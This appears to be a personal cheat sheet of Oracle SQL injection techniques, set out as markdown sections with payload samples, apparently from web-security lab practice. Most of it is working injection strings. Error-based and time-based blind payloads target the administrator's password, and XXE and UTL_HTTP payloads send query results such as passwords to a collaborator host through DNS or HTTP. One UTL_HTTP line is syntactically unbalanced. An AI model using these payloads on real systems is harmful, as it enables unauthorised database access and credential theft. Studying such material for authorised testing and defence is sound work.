## summary

Useful SQL commands for oracle dbms

## string concatenation
`'foo'||'bar'`

## substring
`SUBSTR('foobar',4,2)`

## comments
`--comments`

`/*comments*/`

## database version
`select banner from v$version`

`select version from v$instance`

## database contents
`select table_name from all_tables`

`select column_name from all_tab_columns where table_name = 'TABLE NAME HERE'`

## conditional errors
`select case when (YOUR-CONDITION-HERE) then to_char(1/0) else null end from dual`

### samples
`xyz' and (select case when(1=1) then to_char(1/0) else 'a' end from users where username='administrator2')='a'--`

`xyz' and (select case when (length(password)=20) then to_char(1/0) else 'a' end from users where username='administrator')='a'--`

`xyz' and (select case when (length(password)=20) then to_char(1/0) else 'a' end from users where username='administrator')='a'--`

## batched (or stacked) queries
does not support batched queries

## time delays
`dbms_pipe.receive_message(('a'),10)`

## conditional time delays
`select case when (YOUR-CONDITION-HERE) then 'a'||dbms_pipe.receive_message(('a'),10) else null end from dual`

## dns lookup
### technique 1
The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched oracle installations in existence.

`select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net"> %remote;]>'),'/l') FROM dual`

#### samples
`xyz' union select extractvalue(xmltype('<?xml+version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://YOUR-COLLABORATOR.burpcollaborator.net/"> %25remote%3b]>'),'/l') from dual--`

### technique 2
The following technique works on fully patched oracle installations, but requires elevated privileges.

`select UTL_INADDR.get_host_address('YOUR-COLLABORATOR.burpcollaborator.net')` 

## dns lookup with data exfiltration
`select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-COLLABORATOR.burpcollaborator.net"> %remote;]>'),'/l') from dual`

#### samples
`xyz' union select extractvalue(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||password||'.YOUR-COLLABORATOR.burpcollaborator.net"> %25remote%3b]>'),'/l') from users where username='administrator'--`

## http request with data exfiltration
`UTL_HTTP.request('YOUR-COLLABORATOR.burpcollaborator.net:80'||(select user from dual)--`


